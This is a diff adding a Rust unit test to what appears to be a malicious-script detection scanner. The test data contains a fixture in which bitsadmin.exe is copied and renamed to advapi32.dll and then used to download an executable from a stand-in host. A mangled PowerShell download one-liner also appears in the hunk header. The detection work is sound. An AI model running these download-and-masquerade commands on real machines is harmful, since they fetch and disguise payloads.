@@ -21329,6 +21329,55 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
     }
 
     #[test]
+    fn copied_bitsadmin_alias_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: r#"copy C:\Windows\System32\bitsadmin.exe C:\Users\Public\advapi32.dll"#
+                .to_string(),
+            src: r#"C:\Windows\System32\bitsadmin.exe"#.to_string(),
+            dst: r#"C:\Users\Public\advapi32.dll"#.to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Users\Public\advapi32.dll /transfer j1 /download /priority foreground https://copied-bits.example/a.exe C:\Users\Public\a.exe"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\advapi32.dll"#
+                )
+            }),
+            "copied bitsadmin alias did not emit manipulated execution: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::BitsadminDownload { url, dst }
+                        if url == "https://copied-bits.example/a.exe"
+                            && dst == r#"C:\Users\Public\a.exe"#
+                )
+            }),
+            "copied bitsadmin alias did not replay structured download: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://copied-bits.example/a.exe"
+                )
+            }),
+            "copied bitsadmin URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn curl_style_compact_flags_exe_in_deob_text_emits_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
